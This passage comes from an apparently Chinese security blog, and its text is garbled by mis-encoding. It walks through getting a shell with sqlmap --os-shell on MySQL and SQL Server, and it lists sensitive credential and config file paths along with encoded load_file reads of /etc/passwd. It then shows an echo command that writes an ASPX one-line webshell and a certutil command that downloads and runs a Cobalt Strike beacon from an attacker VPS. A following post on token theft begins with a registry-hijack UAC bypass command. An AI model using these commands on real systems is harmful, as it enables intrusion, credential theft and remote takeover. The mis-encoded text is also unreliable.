<li><p>å½“ä¸ºphpæ—¶ï¼Œmagic_quotes_gpcä¸ºoffï¼Œphpä¸»åŠ¨è½¬ä¹‰çš„åŠŸèƒ½å…³é—­**</p>
</li>
</ol>
<p>å½“æ‰§è¡Œ â€“os-shellæ—¶ï¼Œè¿™ä¸ªæ—¶å€™sqlmapä¸»è¦åšäº†ä¸‰ä»¶äº‹æƒ…ï¼š</p>
<ol>
<li>è¿›è¡Œç›®æ ‡çš„ä¸€ä¸ªåŸºç¡€ä¿¡æ¯çš„æ¢æµ‹ã€‚</li>
<li>ä¸Šä¼ shellåˆ°ç›®æ ‡webç½‘ç«™ä¸Šï¼ˆsqlmapä¼šè‡ªåŠ¨ç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªç”¨äºå‘½ä»¤æ‰§è¡Œï¼Œä¸€ä¸ªç”¨äºä¸Šä¼ æ–‡ä»¶ï¼‰</li>
<li>é€€å‡ºæ—¶åˆ é™¤shellã€‚</li>
</ol>
<h3 id="å¯»æ‰¾ç»å¯¹è·¯å¾„"><a href="#å¯»æ‰¾ç»å¯¹è·¯å¾„" class="headerlink" title="å¯»æ‰¾ç»å¯¹è·¯å¾„"></a>å¯»æ‰¾ç»å¯¹è·¯å¾„</h3><ol>
<li><p>é€šè¿‡ç½‘ç«™æŠ¥é”™ä¿¡æ¯æŸ¥çœ‹ç»å¯¹è·¯å¾„</p>
</li>
<li><p>é€šè¿‡æœç´¢å¼•æ“è·å–</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">googleè¯­æ³•ï¼šsite:baidu.com warning</span><br><span class="line">site:baidu.com  &quot;fatal error&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>é…ç½®æ–‡ä»¶è·å–è·¯å¾„<br> å¦‚æœæ³¨å…¥ç‚¹æœ‰æ–‡ä»¶è¯»å–æƒé™ï¼Œå°±å¯ä»¥é€šè¿‡load_fileå‡½æ•°è¯»å–é…ç½®æ–‡ä»¶ï¼Œå†ä»ä¸­å¯»æ‰¾è·¯å¾„ä¿¡æ¯ã€‚</p>
</li>
</ol>
<p>  Sqlmap ä¸‹å¯ä»¥ä½¿ç”¨â€“sql-shell è·å–ä¸€ä¸ªsqlå‘½ä»¤æ‰§è¡Œçª—å£ï¼Œä½¿ç”¨load_file(â€˜æ–‡ä»¶åâ€™)è¯»å–æ–‡ä»¶</p>
<p>  ä¹Ÿå¯ä»¥ä½¿ç”¨ â€“file-read&#x3D;æ–‡ä»¶å ï¼Œè¯»å–æ–‡ä»¶</p>
<p>sqlmap -u â€˜urlâ€™ â€“batch â€“file-read&#x3D;&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</p>
<ul>
<li><p><strong>win ä¸‹å¸¸è§çš„æ•æ„Ÿæ–‡ä»¶</strong></p>
<p><a href="https://link.zhihu.com/?target=https://blog.csdn.net/hardhard123/article/details/80062733">å¸¸ç”¨çš„ç»å¯¹è·¯å¾„æ”¶é›†</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:/boot.ini //æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ </span><br><span class="line">c:/windows/php.ini //phpé…ç½®ä¿¡æ¯ </span><br><span class="line">c:/windows/my.ini //MYSQLé…ç½®æ–‡ä»¶ï¼Œè®°å½•ç®¡ç†å‘˜ç™»é™†è¿‡çš„MYSQLç”¨æˆ·åå’Œå¯†ç  </span><br><span class="line">c:/winnt/php.ini </span><br><span class="line">c:/winnt/my.ini </span><br><span class="line">c:\mysql\data\mysql\user.MYD //å­˜å‚¨äº†mysql.userè¡¨ä¸­çš„æ•°æ®åº“è¿æ¥å¯†ç  </span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //å­˜å‚¨äº†è™šæ‹Ÿä¸»æœºç½‘ç«™è·¯å¾„å’Œå¯†ç  </span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml æŸ¥çœ‹IISçš„è™šæ‹Ÿä¸»æœºé…ç½® </span><br><span class="line">c:\windows\repair\sam //å­˜å‚¨äº†WINDOWSç³»ç»Ÿåˆæ¬¡å®‰è£…çš„å¯†ç  </span><br><span class="line">c:\Program Files\Serv-U\ServUAdmin.exe //6.0ç‰ˆæœ¬ä»¥å‰çš„serv-uç®¡ç†å‘˜å¯†ç å­˜å‚¨äºæ­¤ </span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe </span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cifæ–‡ä»¶ </span><br><span class="line">//å­˜å‚¨äº†pcAnywhereçš„ç™»é™†å¯†ç  </span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf æˆ–C:\apache\conf\httpd.conf //æŸ¥çœ‹WINDOWSç³»ç»Ÿapacheæ–‡ä»¶ </span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //æŸ¥çœ‹jspå¼€å‘çš„ç½‘ç«™ resinæ–‡ä»¶é…ç½®ä¿¡æ¯. </span><br><span class="line">c:/Resin/conf/resin.conf/usr/local/resin/conf/resin.conf æŸ¥çœ‹linuxç³»ç»Ÿé…ç½®çš„JSPè™šæ‹Ÿä¸»æœº </span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf </span><br><span class="line">C:\Program Files\mysql\my.ini </span><br><span class="line">C:\mysql\data\mysql\user.MYD å­˜åœ¨MYSQLç³»ç»Ÿä¸­çš„ç”¨æˆ·å¯†ç </span><br><span class="line">c:\windows\php.iniÂ Â Â Â Â  phpé…ç½®æ–‡ä»¶</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xmlÂ Â Â Â IISè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>Linux ä¸‹å¸¸è§çš„æ•æ„Ÿæ–‡ä»¶</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2ç¼ºçœé…ç½®æ–‡ä»¶ </span><br><span class="line">/usr/local/apache2/conf/httpd.conf </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //è™šæ‹Ÿç½‘ç«™è®¾ç½® </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHPç›¸å…³è®¾ç½® </span><br><span class="line">/etc/sysconfig/iptables //ä»ä¸­å¾—åˆ°é˜²ç«å¢™è§„åˆ™ç­–ç•¥ </span><br><span class="line">/etc/httpd/conf/httpd.conf // apacheé…ç½®æ–‡ä»¶ </span><br><span class="line">/etc/rsyncd.conf //åŒæ­¥ç¨‹åºé…ç½®æ–‡ä»¶ </span><br><span class="line">/etc/my.cnf //mysqlçš„é…ç½®æ–‡ä»¶ </span><br><span class="line">/etc/redhat-release //ç³»ç»Ÿç‰ˆæœ¬ </span><br><span class="line">/etc/issue </span><br><span class="line">/etc/issue.net </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHPç›¸å…³è®¾ç½® </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //è™šæ‹Ÿç½‘ç«™è®¾ç½® </span><br><span class="line">/etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf/httpd.conf æŸ¥çœ‹linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶</span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf é’ˆå¯¹3.0.22çš„RESINé…ç½®æ–‡ä»¶æŸ¥çœ‹ </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf åŒä¸Š </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHEè™šæ‹Ÿä¸»æœºæŸ¥çœ‹ </span><br><span class="line">/etc/httpd/conf/httpd.confæˆ–/usr/local/apche/conf/httpd.conf æŸ¥çœ‹linux APACHEè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf é’ˆå¯¹3.0.22çš„RESINé…ç½®æ–‡ä»¶æŸ¥çœ‹ </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf åŒä¸Š </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHEè™šæ‹Ÿä¸»æœºæŸ¥çœ‹ </span><br><span class="line">/etc/sysconfig/iptables æŸ¥çœ‹é˜²ç«å¢™ç­–ç•¥ </span><br><span class="line">load_file(char(47)) å¯ä»¥åˆ—å‡ºFreeBSD,Sunosç³»ç»Ÿæ ¹ç›®å½• </span><br><span class="line">replace(load_file(0Ã—2F6574632F706173737764),0Ã—3c,0Ã—20) </span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br><span class="line">etc/php.iniÂ Â Â Â Â Â Â Â Â  phpé…ç½®æ–‡ä»¶</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.confÂ Â Â Â Â Â Â Â Apacheé…ç½®æ–‡ä»¶</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.confÂ  è™šæ‹Ÿç›®å½•é…ç½®æ–‡ä»¶</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>é€šè¿‡æ‰§è¡Œ</strong><code>select @@datadir;</code> è·å–æ•°æ®åº“æ•°æ®ä¿å­˜çš„ä½ç½®ã€ <code>select @@basedir;</code> å®‰è£…ä½ç½®ã€<code>select @@plugin_dir</code> mysql pluginç›®å½•</p>
<p>å¯èƒ½ä¼šæœ‰ä¸€äº›å…³é”®ä¿¡æ¯ï¼Œç„¶åå¯¹å…³é”®ä¿¡æ¯æœç´¢ï¼ŒæŸ¥æ‰¾é»˜è®¤è·¯å¾„</p>
</li>
</ul>
<p>	</p>
<h3 id="æ‰§è¡Œâ€“os-shell"><a href="#æ‰§è¡Œâ€“os-shell" class="headerlink" title="æ‰§è¡Œâ€“os-shell"></a>æ‰§è¡Œâ€“os-shell</h3><p>æˆåŠŸåä¼šåœ¨ç½‘ç«™ç»å¯¹è·¯å¾„ä¸‹ï¼Œç”Ÿæˆä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªå¯ä»¥ä¸Šä¼ ï¼Œä¸€ä¸ªå¯ä»¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106105940.png"></p>
<h2 id="SqlServer"><a href="#SqlServer" class="headerlink" title="SqlServer"></a>SqlServer</h2><h3 id="å¿…è¦æ¡ä»¶"><a href="#å¿…è¦æ¡ä»¶" class="headerlink" title="å¿…è¦æ¡ä»¶"></a>å¿…è¦æ¡ä»¶</h3><ul>
<li>æ•°æ®åº“æ”¯æŒå¤–è¿</li>
<li>æ•°æ®åº“æƒé™ä¸ºSAæƒé™</li>
</ul>
<p>Sqlserver â€“os-shellä¸»è¦æ˜¯åˆ©ç”¨<code>xp_cmdshell</code>æ‰©å±•è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚</p>
<p>å½“æ‰§è¡Œâ€“os-shell æ—¶ï¼Œè¿™ä¸ªæ—¶å€™sqlmapä¸»è¦åšäº†ä¸‰ä»¶äº‹æƒ…ï¼š</p>
<ol>
<li>è¯†åˆ«å½“å‰æ•°æ®åº“ç±»å‹ï¼Œç„¶åæ‰“å°å‡ºæ¥ã€‚</li>
<li>æ£€æµ‹æ˜¯å¦ä¸ºæ•°æ®åº“dbaï¼Œä¹Ÿå°±æ˜¯æŸ¥çœ‹æ˜¯å¦ä¸ºsaæƒé™ã€‚</li>
<li>æ£€æµ‹æ˜¯å¦å¼€å¯äº†xp_cmdshellï¼Œå¦‚æœæ²¡æœ‰å¼€å¯sqlmapå°±ä¼šå°è¯•å¼€å¯ã€‚</li>
</ol>
<h3 id="å¯»æ‰¾ç»å¯¹è·¯å¾„-1"><a href="#å¯»æ‰¾ç»å¯¹è·¯å¾„-1" class="headerlink" title="å¯»æ‰¾ç»å¯¹è·¯å¾„"></a>å¯»æ‰¾ç»å¯¹è·¯å¾„</h3><p>å¯ä»¥ä¸Šä¼ ä¸€ä¸ªå¤æ‚æ–‡ä»¶åçš„æ–‡ä»¶ï¼Œæ¯”å¦‚ï¼šl12asd3123_0sads7_08.jpg</p>
<p>æˆ–è€…åœ¨ç½‘ç«™ä¸­æ‰¾åˆ°ä¸€ä¸ªå¤æ‚çš„æ–‡ä»¶åï¼Œè§‰å¾—ä¼šæ˜¯å”¯ä¸€çš„ï¼Œé€šè¿‡å‘½ä»¤æŸ¥æ‰¾</p>
<p>sqlmap  â€“os-shell ä¸‹ä½¿ç”¨ï¼Œä»¥ä¸‹ä»»æ„ä¸€æ¡å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /r e:\ %i in (1*.php) do @echo %i  *å¿…åŠ </span><br><span class="line">dir c:\ d:\  /s /b | find &quot;icon_assignment.gif&quot;</span><br></pre></td></tr></table></figure>

<p>æŸ¥æ‰¾æ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110036.png"></p>
<h3 id="ä¸Šä¸€å¥è¯é©¬æˆ–è€…è¿cs"><a href="#ä¸Šä¸€å¥è¯é©¬æˆ–è€…è¿cs" class="headerlink" title="ä¸Šä¸€å¥è¯é©¬æˆ–è€…è¿cs"></a>ä¸Šä¸€å¥è¯é©¬æˆ–è€…è¿cs</h3><h4 id="å†™ä¸€å¥è¯æœ¨é©¬"><a href="#å†™ä¸€å¥è¯æœ¨é©¬" class="headerlink" title="å†™ä¸€å¥è¯æœ¨é©¬"></a>å†™ä¸€å¥è¯æœ¨é©¬</h4><p><code> echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;weshe11b&quot;],&quot;unsafe&quot;);%^&gt; &gt; d:\wwwroot\1azq.aspx</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110059.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110119.png"></p>
<h4 id="ä¸Šçº¿CS"><a href="#ä¸Šçº¿CS" class="headerlink" title="ä¸Šçº¿CS"></a>ä¸Šçº¿CS</h4><p>ä½¿ç”¨ <code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe a32.exe</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110147.png"></p>
<p>a32.exe æ‰§è¡Œï¼Œ æœ‰æ—¶æ‰§è¡Œä¸æˆåŠŸé¥­æ˜¯å› ä¸ºæƒé™ä¸å¤Ÿï¼Œå¯ä»¥ä¸‹è½½åˆ°æœ‰æ‰§è¡Œæƒé™çš„ç›®å½•ï¼ˆå‡å¦‚c:&#x2F;temp&#x2F; ï¼Œæœ‰æƒé™ï¼Œ<code>certutil.exe -urlcache -split -f http://vpsIP:port/beacon32.exe c:/temp/a32.exe </code></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/blog/sqlmap%E5%85%B3%E4%BA%8E-os-shell%E5%B0%8F%E8%AE%B0/20201106110212.png"></p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>åœ¨æœ‰æ‹¥æœ‰dbaæƒé™åï¼Œ</p>
<ul>
<li>mysqlæ‹¿shellçš„éš¾ç‚¹åœ¨äºå¯»æ‰¾ç»å¯¹è·¯å¾„</li>
<li>sqlserveråœ¨äºxp_cmdshell æ˜¯å¦å¼€å¯ã€‚</li>
</ul>
]]></content>
      <categories>
        <category>å®‰å…¨å·¥å…·</category>
      </categories>
      <tags>
        <tag>sqlmapä½¿ç”¨</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ</title>
    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
    <content><![CDATA[<blockquote>
<p>  å¿«è¿‡å¹´äº†ï¼Œå°ä¼™ä¼´ä»¬æè®®å‡ºå»æµªä¸€ä¸‹ï¼Œå†³å®šè¦å»ç©ææ€–ç±»å¯†å®¤é€ƒè„±ï¼Œç‘Ÿç‘Ÿå‘æŠ–o((âŠ™ï¹âŠ™))o.</p>
</blockquote>
<h2 id="ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ"><a href="#ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ" class="headerlink" title="ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ"></a>ä»¤ç‰Œçªƒå–åˆ†æåŠé˜²èŒƒ</h2><h2 id="0x01-ä»¤ç‰Œæ¦‚è¿°"><a href="#0x01-ä»¤ç‰Œæ¦‚è¿°" class="headerlink" title="0x01 ä»¤ç‰Œæ¦‚è¿°"></a>0x01 ä»¤ç‰Œæ¦‚è¿°</h2><p>ä»¤ç‰Œ( Token )æ˜¯æŒ‡ç³»ç»Ÿä¸­çš„ä¸´æ—¶å¯†é’¥ï¼Œç›¸å½“äºè´¦æˆ·å’Œå¯†ç ï¼Œç”¨äºå†³å®šæ˜¯å¦å…è®¸å½“å‰è¯·æ±‚åŠåˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å±äºå“ªä¸ªç”¨æˆ·çš„ã€‚è·å¾—äº†ä»¤ç‰Œï¼Œå°±å¯ä»¥åœ¨ä¸æä¾›å¯†ç æˆ–å…¶ä»–å‡­è¯çš„æƒ…å†µä¸‹è®¿é—®ç½‘ç»œå’Œç³»ç»Ÿèµ„æºã€‚è¿™äº›ä»¤ç‰Œå°†æŒç»­å­˜åœ¨äºç³»ç»Ÿä¸­(é™¤éç³»ç»Ÿé‡æ–°å¯åŠ¨)ã€‚</p>
<p>ä»¤ç‰Œçš„æœ€å¤§ç‰¹ç‚¹æ˜¯éšæœºæ€§å’Œä¸å¯é¢„æµ‹æ€§ï¼Œä¸€èˆ¬çš„æ”»å‡»è€…æˆ–è½¯ä»¶éƒ½æ— æ³•å°†ä»¤ç‰ŒçŒœæµ‹å‡ºæ¥ã€‚ä»¤ç‰Œä¸€èˆ¬åˆ†ä¸ºä»¥ä¸‹å‡ ç§ï¼š</p>
<ul>
<li>è®¿é—®ä»¤ç‰Œ(Access Token) ä»£è¡¨è®¿é—®æ§åˆ¶æ“ä½œä¸»ä½“çš„ç³»ç»Ÿå¯¹è±¡ã€‚(æœ¬æ–‡ä¸»è¦è®²Windowsçš„AccessToken)</li>
<li>å¯†ä¿ä»¤ç‰Œ(Security Token) ä¹Ÿå«ä½œè®¤è¯ä»¤ç‰Œæˆ–è€…ç¡¬ä»¶ä»¤ç‰Œï¼Œæ˜¯ä¸€ç§ç”¨äºå®ç°è®¡ç®—æœºèº«ä»½æ ¡éªŒçš„ç‰©ç†è®¾å¤‡ï¼Œä¾‹å¦‚Uç›¾ã€‚</li>
<li>ä¼šè¯ä»¤ç‰Œ ( SessionToken)æ˜¯äº¤äº’ä¼šè¯ä¸­å”¯ä¸€çš„èº«ä»½æ ‡è¯†ç¬¦ã€‚</li>
</ul>
<h4 id="Windowsè®¿é—®ä»¤ç‰Œ"><a href="#Windowsè®¿é—®ä»¤ç‰Œ" class="headerlink" title="Windowsè®¿é—®ä»¤ç‰Œ"></a>Windowsè®¿é—®ä»¤ç‰Œ</h4><p>Windows è®¿é—®ä»¤ç‰Œ(Access Tokens) æ˜¯ä¸€ä¸ªæè¿°è¿›ç¨‹æˆ–çº¿ç¨‹å®‰å…¨ä¸Šä¸‹æ–‡çš„å¯¹è±¡ã€‚ä»¤ç‰Œæ‰€åŒ…å«çš„ä¿¡æ¯æ˜¯ä¸è¯¥ç”¨æˆ·è´¦æˆ·ç›¸å…³çš„è¿›ç¨‹æˆ–çº¿ç¨‹çš„èº«ä»½å’Œæƒé™ä¿¡æ¯ã€‚å½“ç”¨æˆ·ç™»å½•æ—¶ï¼Œç³»ç»Ÿé€šè¿‡å°†ç”¨æˆ·è¾“å…¥çš„å¯†ç ä¸å‚¨å­˜åœ¨å®‰å…¨æ•°æ®åº“ä¸­çš„å¯†ç è¿›è¡Œå¯¹æ¯”ã€‚è‹¥å¯†ç æ­£ç¡®ï¼Œç³»ç»Ÿå°†ç”Ÿæˆä¸€ä¸ªè®¿é—®ä»¤ç‰Œã€‚ä¹‹åï¼Œè¯¥ç”¨æˆ·æ‰§è¡Œçš„æ¯ä¸ªè¿›ç¨‹éƒ½ä¼šæ‹¥æœ‰ä¸€ä¸ªè¯¥è®¿é—®ä»¤ç‰Œçš„å‰¯æœ¬ã€‚</p>
<p>ç›®å‰è®¿é—®ä»¤ç‰Œåˆ†ä¸ºä¸¤ç§ä»¤ç‰Œï¼š</p>
<ul>
<li>ä¸»ä»¤ç‰Œï¼ˆæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½å…·æœ‰ä¸€ä¸ªå”¯ä¸€çš„ä¸»ä»¤ç‰Œï¼Œè¿›ç¨‹é€šè¿‡ä¸»ä»¤ç‰Œè¢«å¼€å¯ï¼‰</li>
<li>æ¨¡æ‹Ÿä»¤ç‰Œï¼ˆåœ¨é»˜è®¤çš„æƒ…å†µä¸‹ï¼Œå½“çº¿ç¨‹è¢«å¼€å¯çš„æ—¶å€™ï¼Œæ‰€åœ¨è¿›ç¨‹çš„ä¸»ä»¤ç‰Œä¼šè‡ªåŠ¨é™„åŠ åˆ°å½“å‰çº¿ç¨‹ä¸Šï¼Œä½œä¸ºçº¿ç¨‹çš„å®‰å…¨ä¸Šä¸‹æ–‡ã€‚è€Œçº¿ç¨‹å¯ä»¥è¿è¡Œåœ¨å¦ä¸€ä¸ªéä¸»ä»¤ç‰Œçš„è®¿é—®ä»¤ç‰Œä¸‹æ‰§è¡Œï¼Œè€Œè¿™ä¸ªä»¤ç‰Œè¢«ç§°ä¸ºæ¨¡æ‹Ÿä»¤ç‰Œã€‚è€ŒæŒ‡å®šçº¿ç¨‹çš„æ¨¡æ‹Ÿä»¤ç‰Œçš„è¿‡ç¨‹è¢«ç§°ä¸ºæ¨¡æ‹Ÿï¼‰</li>
</ul>
<p>ä¸»ä»¤ç‰Œæ˜¯ä¸è¿›ç¨‹ç›¸å…³çš„ï¼›æ¨¡æ‹Ÿçš„ä»¤ç‰Œæ˜¯ä¸æ¨¡æ‹Ÿä»¤ç‰Œçš„çº¿ç¨‹ç›¸å…³çš„ã€‚ä¸»ä»¤ç‰Œå’Œæ¨¡æ‹Ÿä»¤ç‰Œï¼Œéƒ½ä¼šåœ¨ç³»ç»Ÿé‡å¯æˆ–è€…å…³æœºåå…¨éƒ¨æ¸…é™¤ã€‚</p>
<p>å½“çº¿ç¨‹ä¸å®‰å…¨å¯¹è±¡è¿›è¡Œäº¤äº’æˆ–å°è¯•æ‰§è¡Œéœ€è¦ç‰¹æƒçš„ç³»ç»Ÿä»»åŠ¡æ—¶ï¼Œç³»ç»Ÿä½¿ç”¨è®¿é—®ä»¤ç‰Œæ¥æ ‡è¯†ç”¨æˆ·ã€‚è®¿é—®ä»¤ç‰ŒåŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼š</p>
<ul>
<li>ç”¨æˆ·å¸æˆ·çš„å®‰å…¨æ ‡è¯†ç¬¦(SID)</li>
<li>ç”¨æˆ·å¸æˆ·æ‰€å±çš„ç”¨æˆ·ç¾¤çš„SIDs</li>
<li>ä¸€ä¸ªlogon SIDï¼Œæ ‡è¯†å½“å‰ç™»å½•ä¼šè¯</li>
<li>ç”¨æˆ·æˆ–ç”¨æˆ·ç¾¤çš„ç‰¹æƒæ¸…å•</li>
<li>æ‰€æœ‰è€…çš„SID</li>
<li>åŸºæœ¬ç¾¤çš„SID</li>
<li>å½“ç”¨æˆ·åˆ›å»ºå¯å®‰å…¨å¯¹è±¡ï¼ˆsecurable objectï¼‰ä¸”æ²¡æœ‰ç»™å‡ºå®‰å…¨æè¿°ç¬¦æ—¶ï¼Œç³»ç»Ÿä½¿ç”¨çš„ç¼ºçœçš„è‡ªä¸»è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆDACLï¼‰</li>
<li>è®¿é—®ä»¤ç‰Œèµ„æº</li>
<li>æ˜¯å¦ä¸ºprimaryæˆ–impersonation token</li>
<li>é™åˆ¶æ€§SIDsçš„å¯é€‰åˆ—è¡¨</li>
<li>å½“å‰impersonationçº§åˆ«</li>
<li>å…¶ä»–ç»Ÿè®¡</li>
</ul>
<p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨è®¿é—®ä»¤ç‰Œåœ¨ä¸åŒçš„ç”¨æˆ·æˆ–ç³»ç»Ÿå®‰å…¨æ€§ä¸Šä¸‹æ–‡ä¸‹è¿›è¡Œæ“ä½œï¼Œä»¥æ‰§è¡Œæ“ä½œå¹¶é€ƒé¿æ£€æµ‹ã€‚</p>
<p>æ”»å‡»è€…å¯ä»¥ä½¿ç”¨å†…ç½®çš„Windows APIå‡½æ•°æ¥å¤åˆ¶ç°æœ‰è¿›ç¨‹ä¸­çš„è®¿é—®ä»¤ç‰Œã€‚è¿™è¢«ç§°ä¸ºä»¤ç‰Œçªƒå–ã€‚</p>
<p>æ”»å‡»è€…å¿…é¡»å·²ç»åœ¨ç‰¹æƒç”¨æˆ·ä¸Šä¸‹æ–‡ï¼ˆå³ç®¡ç†å‘˜ï¼‰ä¸­æ‰èƒ½çªƒå–ä»¤ç‰Œã€‚æ”»å‡»è€…é€šå¸¸ä½¿ç”¨ä»¤ç‰Œçªƒå–å°†å…¶å®‰å…¨ä¸Šä¸‹æ–‡ä»ç®¡ç†å‘˜çº§åˆ«æå‡åˆ°SYSTEMçº§åˆ«ã€‚å¦‚æœå¸æˆ·å¯¹è¿œç¨‹ç³»ç»Ÿå…·æœ‰é€‚å½“çš„æƒé™ï¼Œåˆ™å¯¹æ‰‹å¯ä»¥ä½¿ç”¨ä»¤ç‰Œä½œä¸ºè¯¥ä»¤ç‰Œçš„å¸æˆ·å‘è¿œç¨‹ç³»ç»Ÿè¿›è¡Œèº«ä»½éªŒè¯ã€‚</p>
<p><strong>åˆ—ä¸¾ä»¤ç‰Œåªèƒ½åˆ—å‡ºå½“å‰ç”¨æˆ·å’Œæ¯”å½“å‰ç”¨æˆ·æƒé™æ›´ä½ç”¨æˆ·çš„ä»¤ç‰Œï¼Œä¾‹å¦‚å½“å‰æƒé™æ˜¯systemæˆ–è€…æ˜¯administratorï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥çœ‹åˆ°ç³»ç»Ÿä¸­æ‰€æœ‰çš„ä»¤ç‰Œã€‚</strong></p>
<h2 id="0x02-ä»¤ç‰Œçªƒå–"><a href="#0x02-ä»¤ç‰Œçªƒå–" class="headerlink" title="0x02 ä»¤ç‰Œçªƒå–"></a>0x02 ä»¤ç‰Œçªƒå–</h2><h5 id="ä½¿ç”¨MSFä¸­çš„-incognito-æ’ä»¶"><a href="#ä½¿ç”¨MSFä¸­çš„-incognito-æ’ä»¶" class="headerlink" title="ä½¿ç”¨MSFä¸­çš„ incognito æ’ä»¶"></a>ä½¿ç”¨MSFä¸­çš„ incognito æ’ä»¶</h5><p>ç”±äºæˆ‘å½“å‰çš„æƒé™æ˜¯ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œæ‰€ä»¥ä»¤ç‰Œçªƒå–åªèƒ½çªƒå–åˆ°å½“å‰ç”¨æˆ·æœ¬èº«</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
<p>åˆ©ç”¨ä¸Šä¸€èŠ‚<strong>Windowsææƒ-BypassUACä¹‹åŠ«æŒæ³¨å†Œè¡¨å®éªŒ</strong> ï¼Œä½¿ç”¨UACææƒï¼Œå…ˆå¦èµ·ä¸€ä¸ªMSFç›‘å¬ï¼Œç„¶ååœ¨æœ¬sessoinä¸­çš„shellä¸­æ‰§è¡Œ</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
<blockquote>
<p>  Delegation Tokenï¼šä¹Ÿå°±æ˜¯æˆæƒä»¤ç‰Œï¼Œå®ƒæ”¯æŒäº¤äº’å¼ç™»å½•(ä¾‹å¦‚å¯ä»¥é€šè¿‡è¿œç¨‹æ¡Œé¢ç™»å½•è®¿é—®)</p>
